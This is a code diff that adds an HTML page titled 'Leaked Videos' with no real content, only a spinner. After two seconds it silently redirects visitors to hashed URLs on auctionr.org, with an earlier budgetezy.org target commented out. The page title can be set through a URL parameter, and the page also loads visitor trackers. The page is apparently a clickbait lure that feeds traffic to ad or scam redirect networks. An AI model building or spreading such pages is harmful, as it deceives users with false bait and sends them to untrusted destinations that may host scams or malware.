@@ -1,0 +1,81 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <meta name="robots" content="noindex" />
+
+  <title>Leaked Videos</title>
+
+  <!-- Fallback redirect after 1 seconds if JS is disabled -->
+  <!-- xxx
+  <meta http-equiv="refresh" content="2; url=https://budgetezy.org/4/8b066bc0e873c4edb3c7e69d3ee20188" />
+  -->
+  <!-- xxxx -->
+  <meta http-equiv="refresh" content="2; url=https://auctionr.org/4/73cce5e7bd30b860ccdd0ad523981f55" />
+  
+  <style>
+    .loading-redirect {
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      text-align: center !important;
+    }
+    .lds-dual-ring {
+      display: inline-block;
+      width: 64px;
+      height: 64px;
+    }
+    .lds-dual-ring:after {
+      content: " ";
+      display: block;
+      width: 46px;
+      height: 46px;
+      margin: 1px;
+      border-radius: 50%;
+      border: 5px solid #222;
+      border-color: #222 transparent #222 transparent;
+      animation: lds-dual-ring 1.2s linear infinite;
+    }
+    @keyframes lds-dual-ring {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+
+  <script>
+    (function () {
+      const params = new URLSearchParams(window.location.search);
+      const t = params.get("t");
+      document.title = (t === null || t.trim() === "") ? "Leaked Videos" : t;
+
+      const REDIRECT_URL = "https://auctionr.org/4/6ceb292103750c47b1f0a35b075eadf2";
+
+      // JS redirect with 1-second delay
+      setTimeout(() => {
+        window.location.replace(REDIRECT_URL);
+      }, 2000);
+    })();
+  </script>
+</head>
+<body class="loading-redirect">
+  <div class="lds-dual-ring"></div>
+
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4985492,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"8a425239a36a4829bcaaafc1cacdc356","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
